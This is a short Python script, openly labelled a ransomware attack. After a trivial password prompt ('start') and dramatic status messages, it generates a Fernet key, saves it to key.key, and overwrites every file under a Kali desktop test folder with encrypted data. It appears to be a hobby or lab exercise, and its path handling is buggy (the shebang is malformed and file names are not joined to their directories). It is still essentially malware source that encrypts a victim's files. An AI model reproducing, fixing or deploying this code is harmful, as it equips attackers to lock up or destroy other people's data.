 #!/bash/python3
import os
from cryptography.fernet import Fernet
import time
import random
import sys

protection = input("Please enter the protection password: ")
if protection != "start":
        quit()

else:
	def slowprint(s):
		for c in s + "\n":
			sys.stdout.write(c)
			sys.stdout.flush()
			time.sleep(random.random() * 0.1)
slowprint("[+] Starting Ransomware Attack")
slowprint("[+] Generating keys")
slowprint("[+] Encrypting data...")
slowprint("[+] Data Encrypted")
slowprint("[+]Attack Succeded")
slowprint("[+]Exiting...")

key = Fernet.generate_key()
with open("key.key","wb") as key_file:
	key_file.write(key)

for root, dirs, files in os.walk('/home/kali/Desktop/Teste'):
	for files in files:
		cipher = Fernet(key)
		with open(files, "rb") as f:
			file_data = f.read()
			encrypted_data = cipher.encrypt(file_data)
		with open(files,"wb") as f:
			f.write(encrypted_data)
